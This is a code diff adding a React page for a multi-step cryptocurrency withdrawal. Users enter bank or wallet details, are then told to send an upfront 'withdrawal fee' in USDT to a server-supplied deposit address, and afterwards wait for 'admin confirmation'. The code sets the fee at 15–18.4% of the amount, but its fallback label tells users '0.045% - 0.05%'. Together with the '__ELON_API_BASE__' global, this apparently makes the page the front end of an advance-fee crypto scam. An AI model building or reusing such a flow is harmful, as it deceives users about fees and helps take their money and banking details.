@@ -1,0 +1,595 @@
+﻿import { useState, useEffect } from 'react';
+import { useNavigate, useLocation } from 'react-router-dom';
+import API from '../../../services/api';
+import { useApi } from '../../../hooks/useApi';
+import './WithdrawalProcessPage.css';
+
+const FEE_DISPLAY_CURRENCY = 'USD';
+const MIN_WITHDRAWAL_FEE_RATE = 0.15;
+const MAX_WITHDRAWAL_FEE_RATE = 0.184;
+const FEE_DEPOSIT_CURRENCY = 'USDT';
+
+export default function WithdrawalProcessPage() {
+  const navigate = useNavigate();
+  const location = useLocation();
+  const { loading } = useApi();
+  const [step, setStep] = useState(1); // 1: Transfer Info, 2: Recipient Info, 3: Review, 4: Payment/Deposit
+  const [error, setError] = useState('');
+  const [withdrawalId, setWithdrawalId] = useState(null);
+  const [depositAddress, setDepositAddress] = useState('');
+  const [depositLoading, setDepositLoading] = useState(false);
+  const [awaitingAdmin, setAwaitingAdmin] = useState(false);
+  const [submitLoading, setSubmitLoading] = useState(false);
+  const [formData, setFormData] = useState({
+    currency: '',
+    amount: '',
+    address: '',
+    name: '',
+    country: '',
+    accountType: 'bank',
+    bankName: '',
+    accountNumber: '',
+    accountHolder: '',
+    bankCode: '',
+  });
+
+  const amountUsd = parseFloat(formData.amount) || 0;
+  const initialFeeUsd = Number(location.state?.initialData?.fee_amount ?? location.state?.feeAmount ?? 0);
+  const estimatedFeeUsd = amountUsd * ((MIN_WITHDRAWAL_FEE_RATE + MAX_WITHDRAWAL_FEE_RATE) / 2);
+  const feeUsd = initialFeeUsd > 0 ? initialFeeUsd : estimatedFeeUsd;
+  const feeRateLabel = (amountUsd > 0 && initialFeeUsd > 0)
+    ? `${((feeUsd / amountUsd) * 100).toFixed(3).replace(/0+$/, '').replace(/\.$/, '')}%`
+    : '0.045% - 0.05%';
+
+  // Pre-fill form with data from WithdrawalsPage + saved banking details
+  useEffect(() => {
+    const initial = location.state?.initialData || {};
+    setFormData(prev => ({
+      ...prev,
+      currency: initial.currency || prev.currency,
+      amount: initial.amount || prev.amount,
+      address: initial.address || prev.address,
+    }));
+    if (initial.withdrawal_id) setWithdrawalId(initial.withdrawal_id);
+
+    // Load saved banking details from API and pre-fill recipient section
+    API.get('/users/banking-details')
+      .then(res => {
+        const b = res?.data;
+        if (!b) return;
+        setFormData(prev => ({
+          ...prev,
+          country: b.country || prev.country,
+          accountHolder: b.acctName || prev.accountHolder,
+          accountNumber: b.acctNumber || prev.accountNumber,
+          bankCode: b.branch || prev.bankCode,
+        }));
+      })
+      .catch(() => {}); // silently ignore if not saved yet
+  }, [location.state]);
+
+  const handleChange = (e) => {
+    setFormData({
+      ...formData,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const handleNextStep = async () => {
+    setError('');
+
+    if (step === 1) {
+      if (!formData.currency.trim()) {
+        setError('Please select a currency');
+        return;
+      }
+      if (!formData.amount || parseFloat(formData.amount) <= 0) {
+        setError('Please enter a valid amount');
+        return;
+      }
+      setStep(2);
+    } else if (step === 2) {
+      if (formData.accountType === 'crypto') {
+        if (!formData.address.trim()) {
+          setError('Please enter a crypto address');
+          return;
+        }
+        if (!formData.name.trim()) {
+          setError('Please enter a name');
+          return;
+        }
+      } else {
+        if (!formData.bankName.trim()) {
+          setError('Please enter bank name');
+          return;
+        }
+        if (!formData.accountNumber.trim()) {
+          setError('Please enter account number');
+          return;
+        }
+        if (!formData.accountHolder.trim()) {
+          setError('Please enter account holder name');
+          return;
+        }
+        if (!formData.country.trim()) {
+          setError('Please select a country');
+          return;
+        }
+      }
+      setStep(3);
+    } else if (step === 3) {
+      // Moving from Review to Payment - fetch deposit address
+      setStep(4);
+      await fetchDepositAddress(FEE_DEPOSIT_CURRENCY);
+    }
+  };
+
+  const fetchDepositAddress = async (currency) => {
+    setDepositLoading(true);
+    try {
+      const API_BASE = import.meta.env.VITE_API_URL || window?.__ELON_API_BASE__ || '/api';
+      const response = await fetch(`${API_BASE}/deposit/address?currency=${currency}`);
+      const data = await response.json();
+      if (response.ok && data.address) {
+        setDepositAddress(data.address);
+      } else {
+        setError('Unable to fetch deposit address. Please contact support.');
+      }
+    } catch (err) {
+      console.error('Failed to fetch deposit address:', err);
+      setError('Failed to load deposit address');
+    } finally {
+      setDepositLoading(false);
+    }
+  };
+
+  const handleSubmit = async () => {
+    setError('');
+    setSubmitLoading(true);
+    try {
+      // build path and include auth via axios helper
+      // use axios wrapper for authenticated POSTs
+      let resp;
+      try {
+        resp = await API.post('/withdrawals/confirm-fee', {
+          withdrawal_id: withdrawalId,
+          amount: formData.amount,
+        });
+      } catch (e) {
+        resp = e.response;
+      }
+
+      // fallback if alias endpoint not available
+      if (resp && resp.status === 404) {
+        console.warn('[Fee] /confirm-fee returned 404, using fee-submitted');
+        try {
+          resp = await API.post(`/withdrawals/${withdrawalId}/fee-submitted`, {
+            amount: formData.amount,
+          });
+        } catch (e2) {
+          resp = e2.response;
+        }
+      }
+
+      console.log('[Fee] response status', resp?.status, 'data', resp?.data);
+      const data = resp?.data || {};
+
+      if (resp && resp.status >= 200 && resp.status < 300 && data.approved) {
+        navigate('/withdrawal-process', {
+          state: {
+            amount: formData.amount,
+            currency: formData.currency,
+            withdrawalId: withdrawalId,
+            feeAmount: feeUsd.toFixed(2),
+          },
+        });
+        return;
+      }
+
+      setAwaitingAdmin(true);
+    } catch (err) {
+      console.warn('Failed to contact backend, remaining on fee page', err);
+      setAwaitingAdmin(true);
+    } finally {
+      setSubmitLoading(false);
+    }
+  };
+
+  const handleBack = () => {
+    if (step > 1) setStep(step - 1);
+  };
+
+  // Real-time updates: subscribe to SSE stream (global) and react when this withdrawal is updated
+  useEffect(() => {
+    if (!withdrawalId) return;
+    // build URL using API_BASE so the stream hits the backend service
+    const API_BASE = import.meta.env.VITE_API_URL || window?.__ELON_API_BASE__ || '/api';
+    const url = `${API_BASE.replace(/\/+$/,'')}/updates/stream?userId=global`;
+    let es;
+    try {
+      es = new EventSource(url);
+      es.onopen = () => {
+        console.log('[SSE] connection opened to', url);
+      };
+    } catch (e) {
+      console.warn('SSE not supported or failed to connect', e);
+      return;
+    }
+
+    const onUpdate = (e) => {
+      console.log('[SSE] received event', e.type, e.data);
+      try {
+        const msg = JSON.parse(e.data || '{}');
+        const payload = msg.payload || {};
+        const id = payload.id || payload.withdrawalId || null;
+        if (!id) return;
+        if (String(id) === String(withdrawalId)) {
+          // if admin has taken any action beyond the initial pending state we can
+          // move the user to the processing page. status 'processing' happens when
+          // the fee is confirmed, 'completed' when the withdrawal is finished.
+          if ((payload.status === 'processing' || payload.status === 'completed') && payload.fee_status === 'confirmed') {
+            setAwaitingAdmin(false);
+            console.log('[SSE] withdrawal updated to', payload.status, ', redirecting');
+            navigate('/withdrawal-process', {
+              state: {
+                amount: formData.amount,
+                currency: formData.currency,
+                withdrawalId: withdrawalId,
+                feeAmount: feeUsd.toFixed(2),
+              },
+            });
+          } else {
+            // some other update (maybe user changed amount etc.) just clear flag
+            setAwaitingAdmin(false);
+          }
+        }
+      } catch (err) { console.warn('SSE parse error', err); }
+    };
+
+    es.addEventListener('withdrawal_update', onUpdate);
+    es.onerror = (err) => { console.warn('SSE error', err); };
+
+    return () => {
+      try { es.removeEventListener('withdrawal_update', onUpdate); es.close(); } catch (e) { /* ignore */ }
+    };
+  }, [withdrawalId, formData.amount, formData.currency, navigate]);
+
+  return (
+    <div className="withdrawal-process-container">
+      <div className="withdrawal-process-card">
+        <div className="process-header">
+          <h1>Withdrawal Processing</h1>
+          <div className="step-indicator">
+              <div className={`step ${step >= 1 ? 'active' : ''}`}>1</div>
+              <div className={`step-line ${step >= 2 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 2 ? 'active' : ''}`}>2</div>
+              <div className={`step-line ${step >= 3 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 3 ? 'active' : ''}`}>3</div>
+              <div className={`step-line ${step >= 4 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 4 ? 'active' : ''}`}>4</div>
+            </div>
+            <div className="step-labels" aria-hidden>
+              <span className="step-label">1. Transfer Info</span>
+              <span className="step-label">2. Recipient Info</span>
+              <span className="step-label">3. Review</span>
+              <span className="step-label">4. I have completed withdrawal fee</span>
+            </div>
+        </div>
+
+        {error && <div className="alert alert-error">{error}</div>}
+
+        {/* Step 1: Transfer Info */}
+        {step === 1 && (
+          <div className="step-content">
+            <h2>Transfer Information</h2>
+
+            <div className="form-group">
+              <label htmlFor="currency">Digital Currency</label>
+              <select
+                id="currency"
+                name="currency"
+                value={formData.currency}
+                onChange={handleChange}
+              >
+                <option value="">Select currency</option>
+                <option value="BTC">Bitcoin (BTC)</option>
+                <option value="ETH">Ethereum (ETH)</option>
+                <option value="USDT">USDT (ERC-20)</option>
+                <option value="USDC">USDC (ERC-20)</option>
+              </select>
+            </div>
+
+            <div className="form-group">
+              <label htmlFor="amount">Withdrawal Amount</label>
+              <input
+                type="number"
+                id="amount"
+                name="amount"
+                value={formData.amount}
+                onChange={handleChange}
+                placeholder="0.00"
+                step="0.01"
+                min="0"
+              />
+              <small className="form-hint">
+                Enter amount in USD. Available balance will be checked during processing.
+              </small>
+            </div>
+          </div>
+        )}
+
+        {/* Step 2: Recipient Info */}
+        {step === 2 && (
+          <div className="step-content">
+            <h2>Recipient Information</h2>
+
+            <div className="form-group">
+              <label>Recipient Type</label>
+              <div className="radio-group">
+                <label className="radio-option">
+                  <input
+                    type="radio"
+                    name="accountType"
+                    value="crypto"
+                    checked={formData.accountType === 'crypto'}
+                    onChange={handleChange}
+                  />
+                  <span>Crypto Wallet</span>
+                </label>
+                <label className="radio-option">
+                  <input
+                    type="radio"
+                    name="accountType"
+                    value="bank"
+                    checked={formData.accountType === 'bank'}
+                    onChange={handleChange}
+                  />
+                  <span>Bank Account</span>
+                </label>
+              </div>
+            </div>
+
+            {formData.accountType === 'crypto' ? (
+              <>
+                <div className="form-group">
+                  <label htmlFor="address">Wallet Address</label>
+                  <input
+                    type="text"
+                    id="address"
+                    name="address"
+                    value={formData.address}
+                    onChange={handleChange}
+                    placeholder="0x..."
+                  />
+                </div>
+                <div className="form-group">
+                  <label htmlFor="name">Name</label>
+                  <input
+                    type="text"
+                    id="name"
+                    name="name"
+                    value={formData.name}
+                    onChange={handleChange}
+                    placeholder="Account name or label"
+                  />
+                </div>
+              </>
+            ) : (
+              <>
+                <div className="form-group">
+                  <label htmlFor="country">Country</label>
+                  <select
+                    id="country"
+                    name="country"
+                    value={formData.country}
+                    onChange={handleChange}
+                  >
+                    <option value="">Select country</option>
+                    <option>United States</option>
+                    <option>United Kingdom</option>
+                    <option>Nigeria</option>
+                    <option>Kenya</option>
+                    <option>Ghana</option>
+                    <option>India</option>
+                    <option>Canada</option>
+                    <option>Australia</option>
+                  </select>
+                </div>
+
+                <div className="form-grid">
+                  <div className="form-group">
+                    <label htmlFor="accountNumber">Account Number</label>
+                    <input
+                      type="text"
+                      id="accountNumber"
+                      name="accountNumber"
+                      value={formData.accountNumber}
+                      onChange={handleChange}
+                      placeholder="1234567890"
+                    />
+                  </div>
+                  <div className="form-group">
+                    <label htmlFor="accountHolder">Account Holder</label>
+                    <input
+                      type="text"
+                      id="accountHolder"
+                      name="accountHolder"
+                      value={formData.accountHolder}
+                      onChange={handleChange}
+                      placeholder="Full name"
+                    />
+                  </div>
+                </div>
+
+                <div className="form-grid">
+                  <div className="form-group">
+                    <label htmlFor="bankName">Bank Name</label>
+                    <input
+                      type="text"
+                      id="bankName"
+                      name="bankName"
+                      value={formData.bankName}
+                      onChange={handleChange}
+                      placeholder="Bank name"
+                    />
+                  </div>
+                  <div className="form-group">
+                    <label htmlFor="bankCode">Bank Code (optional)</label>
+                    <input
+                      type="text"
+                      id="bankCode"
+                      name="bankCode"
+                      value={formData.bankCode}
+                      onChange={handleChange}
+                      placeholder="SWIFT/IBAN"
+                    />
+                  </div>
+                </div>
+              </>
+            )}
+          </div>
+        )}
+
+        {/* Step 3: Review */}
+        {step === 3 && (
+          <div className="step-content">
+            <h2>Review Your Withdrawal</h2>
+
+            <div className="review-summary">
+              <div className="review-row">
+                <span className="label">Withdrawal Method</span>
+                <span className="value">{formData.currency}</span>
+              </div>
+              <div className="review-row">
+                <span className="label">Amount (USD)</span>
+                <span className="value">${amountUsd.toFixed(2)} {FEE_DISPLAY_CURRENCY}</span>
+              </div>
+              <div className="review-row">
+                <span className="label">Fee ({feeRateLabel})</span>
+                <span className="value accent">
+                  ${feeUsd.toFixed(2)} {FEE_DISPLAY_CURRENCY}
+                </span>
+              </div>
+
+              <div className="review-row">
+                <span className="label">Recipient Type</span>
+                <span className="value">{formData.accountType === 'crypto' ? 'Crypto Wallet' : 'Bank Account'}</span>
+              </div>
+              {formData.accountType === 'crypto' ? (
+                <div className="review-row">
+                  <span className="label">Wallet Address</span>
+                  <span className="value mono">{formData.address.substring(0, 10)}...{formData.address.substring(-4)}</span>
+                </div>
+              ) : (
+                <>
+                  <div className="review-row">
+                    <span className="label">Bank</span>
+                    <span className="value">{formData.bankName}</span>
+                  </div>
+                  <div className="review-row">
+                    <span className="label">Account</span>
+                    <span className="value mono">{formData.accountNumber.substring(0, 4)}****{formData.accountNumber.substring(-4)}</span>
+                  </div>
+                </>
+              )}
+            </div>
+
+            <div className="review-notice">
+              <strong>Please review carefully.</strong> Once submitted, you'll need to pay the fee
+              before processing continues.
+            </div>
+          </div>
+        )}
+
+        {/* Step 4: Payment/Deposit */}
+        {step === 4 && (
+          <div className="step-content">
+            <h2>Pay the Withdrawal Fee</h2>
+            <p className="subtitle">Complete the payment to proceed with your withdrawal</p>
+
+            <div className="payment-summary">
+              <div className="summary-item">
+                <span className="label">Withdrawal Amount (USD)</span>
+                <span className="value">${amountUsd.toFixed(2)} {FEE_DISPLAY_CURRENCY}</span>
+              </div>
+              <div className="summary-item">
+                <span className="label">Processing Fee ({feeRateLabel})</span>
+                <span className="value accent">${feeUsd.toFixed(2)} {FEE_DISPLAY_CURRENCY}</span>
+              </div>
+              <div className="summary-divider"></div>
+              <div className="summary-item total">
+                <span className="label">Fee to Pay (USD)</span>
+                <span className="value">${feeUsd.toFixed(2)} {FEE_DISPLAY_CURRENCY}</span>
+              </div>
+            </div>
+
+            {depositLoading ? (
+              <div className="loading-indicator">Loading deposit address...</div>
+            ) : depositAddress ? (
+              <div className="deposit-instruction">
+                <h3>Send Payment To:</h3>
+                <div className="deposit-address-box">
+                  <div className="address-display">
+                    <code>{depositAddress}</code>
+                    <button
+                      type="button"
+                      className="btn-copy"
+                      onClick={() => {
+                        navigator.clipboard.writeText(depositAddress);
+                        alert('Address copied to clipboard');
+                      }}
+                      title="Copy address"
+                    >
+                      Copy
+                    </button>
+                  </div>
+                </div>
+                <div className="payment-notice">
+                  <strong>Important:</strong> Send exactly ${feeUsd.toFixed(2)} USD to the address above (USDT equivalent accepted).
+                  Once confirmed on the blockchain, your withdrawal will be processed.
+                </div>
+              </div>
+            ) : (
+              <div className="error-message">Unable to load deposit address. Please contact support.</div>
+            )}
+          </div>
+        )}
+
+        {/* Navigation Buttons */}
+        <div className="process-actions">
+          <button
+            type="button"
+            className="btn btn-secondary"
+            onClick={handleBack}
+            disabled={step === 1}
+          >
+            Back
+          </button>
+          {step < 4 ? (
+            <button type="button" className="btn btn-primary" onClick={handleNextStep} disabled={step === 3 && depositLoading}>
+              {step === 3 && depositLoading ? 'Loading...' : 'Next'}
+            </button>
+          ) : (
+            <div style={{ width: '100%' }}>
+              {awaitingAdmin ? (
+                <div style={{ marginBottom: '8px' }}>
+                  <div className="alert alert-warn">Your payment has been recorded. Awaiting admin confirmation to process this withdrawal.</div>
+                </div>
+              ) : null}
+
+              <button
+                type="button"
+                className="btn btn-primary"
+                onClick={handleSubmit}
+                disabled={submitLoading || awaitingAdmin}
+              >
+                {submitLoading ? 'Recording payment…' : awaitingAdmin ? 'Awaiting admin confirmation' : 'I have completed withdrawal fee'}
+              </button>
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+}
+
